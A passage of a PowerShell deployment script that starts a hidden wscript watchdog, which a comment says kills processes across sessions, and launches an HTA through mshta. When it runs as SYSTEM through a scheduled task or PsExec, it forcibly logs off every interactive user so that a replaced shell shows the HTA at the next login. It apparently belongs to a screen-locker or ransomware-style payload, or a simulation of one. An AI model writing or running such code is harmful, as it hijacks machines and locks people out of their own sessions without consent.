...
# WMI process killing works cross-session so watchdog works from any session
Start-Process "wscript.exe" -ArgumentList ("""" + $WatchdogPath + """") -WindowStyle Hidden
Write-Host "[+] Watchdog started" -ForegroundColor Yellow

# Detect if running in interactive session or SYSTEM session 0
$sessionId = (Get-Process -Id $PID).SessionId

if ($sessionId -gt 0) {
    # Interactive session (local test or PsExec -i): launch HTA directly
    Start-Process "mshta.exe" -ArgumentList $HtaPath
    Write-Host "[+] HTA launched in interactive session" -ForegroundColor Yellow
} else {
    # SYSTEM session 0 (scheduled task or PsExec -s): HTA would be invisible
    # Force logoff all interactive users — shell replacement shows HTA on re-login
    Write-Host "[+] SYSTEM session — forcing user logoff" -ForegroundColor Yellow
    $queryResult = quser 2>$null
    if ($queryResult) {
        $queryResult | Select-Object -Skip 1 | ForEach-Object {
            if ($_ -match '\s+(\d+)\s+') {
                $userSessionId = $Matches[1]
                logoff $userSessionId /v 2>$null
                Write-Host "[+] Logged off session $userSessionId" -ForegroundColor Yellow
            }
        }
    }
}
